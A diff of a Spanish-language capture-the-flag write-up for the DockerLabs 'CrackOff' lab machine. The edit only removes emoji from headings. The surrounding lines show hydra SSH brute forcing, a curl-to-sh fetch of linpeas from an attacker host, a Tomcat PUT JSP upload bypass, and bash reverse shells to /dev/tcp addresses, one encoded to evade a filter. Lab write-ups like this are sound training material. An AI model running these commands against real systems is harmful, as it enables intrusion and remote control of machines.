@@ -22,13 +22,13 @@ image:
 
 ### Resumen Ejecutivo: Compromiso Total (Root) - CrackOff
 
-**Estado:** 🔴 **CRÍTICO** **Objetivo:** Servidor `CrackOff` (`172.17.0.2`)
+**Estado:** **CRÍTICO** **Objetivo:** Servidor `CrackOff` (`172.17.0.2`)
 
 **Resultado:** Control total del servidor y acceso a datos confidenciales.
 
 ---
 
-### 📈 Resumen del Ataque (Kill Chain)
+### Resumen del Ataque (Kill Chain)
 
 El compromiso se realizó en tres fases críticas aprovechando descuidos de configuración:
 
@@ -36,13 +36,13 @@ El compromiso se realizó en tres fases críticas aprovechando descuidos de conf
 2. **Expansión:** Se encontraron contraseñas en archivos de texto (`mario.txt`) y una base de datos de claves (`KeePass`) olvidada en el sistema.
 3. **Control Total:** Se explotó un script con **permisos mal configurados (777)** que era ejecutado por el administrador. Esto otorgó acceso como **ROOT** (máximo nivel).
 
-### ⚠️ Riesgos Identificados
+### Riesgos Identificados
 
 - **Fuga de Datos:** Acceso a todas las contraseñas personales y corporativas de los usuarios.
 - **Control Total:** El atacante puede borrar, modificar o espiar cualquier información sin dejar rastro.
 - **Persistencia:** Se instaló una "llave maestra" (SSH) para entrar en el futuro sin necesidad de explotar fallos.
     
-### 🛠️ Plan de Acción (Soluciones)
+### Plan de Acción (Soluciones)
 - **Contraseñas:** Cambiar todas las claves de servicios y prohibir guardarlas en archivos `.txt`.
 - **Permisos:** Corregir los permisos de archivos en `/opt` y `/home` para que solo los dueños puedan editarlos.
 - **Seguridad Web:** Restringir el acceso a paneles administrativos solo a IPs autorizadas.
@@ -118,7 +118,7 @@ En la página principal, se detectó un campo de entrada donde se probó una car
 
 ![Web](/assets/images/posts/DockerLabs/crackoff/crack.png) 
 
-### 📂 Análisis de Servicio Adicional (FTP/Nota)
+### Análisis de Servicio Adicional (FTP/Nota)
 
 Durante el reconocimiento, se identificó la posibilidad de acceso anónimo en servicios complementarios, exponiendo información sensible.
 
@@ -250,7 +250,7 @@ Listado de identidades del sistema recuperadas de `crackoff_db`.
 
 Tras la exfiltración de las tablas `users` y `passwords`, se procedió a realizar un ataque de fuerza bruta dirigido para identificar combinaciones válidas que permitieran el acceso remoto vía SSH.
 
-### 🛠️ Metodología
+### Metodología
 1. **Preparación de Diccionarios:** Se generaron dos archivos limpios basados en los datos del dump de SQLMap:    
     - `users.txt`: Conteniendo los 12 nombres de usuario identificados.        
     - `credenciales.txt`: Conteniendo las 12 contraseñas recuperadas de la tabla `passwords`.        
@@ -267,7 +267,7 @@ hydra -L users.txt -P credenciales.txt ssh://172.17.0.2 -t4 -f -V -Z
 - `-f`: Finalizar ejecución al encontrar el primer par válido.
 - `-V / -Z`: Modo detallado y visualización de progreso.
 
-### 🎯 Resultado del Ataque
+### Resultado del Ataque
 
 El ataque fue exitoso, identificando una credencial válida para el usuario **rosa**:
 
@@ -298,7 +298,7 @@ python3 -m http.server 80
 curl http://<IP_ATACANTE>/linpeas.sh | sh
 ```
 
-### 📈 Hallazgos de LinPEAS
+### Hallazgos de LinPEAS
 
 El script resaltó varios puntos críticos en el sistema:
 #### A. Kernel Exploits / Suggester
@@ -465,7 +465,7 @@ Para verificar la vulnerabilidad, se intenta cargar un archivo JSP simple que ej
 curl -X PUT http://127.0.0.1:8080/pwn.jsp/ --data '<% out.println("pwned"); %>'
 ```
 
-### 🔍 Detalles Técnicos:
+### Detalles Técnicos:
 - **El bypass del "/"**: Se añade una barra inclinada `/` al final de la URL (`shell.jsp/`). Esto confunde la validación de archivos de Tomcat en versiones vulnerables, permitiendo que el motor de servlets acepte la escritura del archivo JSP.
 - **Impacto**: Si el servidor responde con un código `201 Created`, cualquier usuario puede subir una _Webshell_ completa y tomar control del servidor sin autenticación previa.
     
@@ -597,10 +597,10 @@ echo "Necesito los informes de la semana pasada ya Alice." > /home/alice/nota.tx
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
-#### 💡 Solución: Payload codificado en hexadecimal (URL encoded)
+#### Solución: Payload codificado en hexadecimal (URL encoded)
 
 Se utilizó una reverse shell clásica en **bash**, codificada con `%HEX` para evadir el filtro del servidor.
-##### 🔐 Payload original (no permitido directamente):
+##### Payload original (no permitido directamente):
 ```bash
 bash -c "bash -i >& /dev/tcp/<IP_Atacante>/4444 0>&1"
 ```
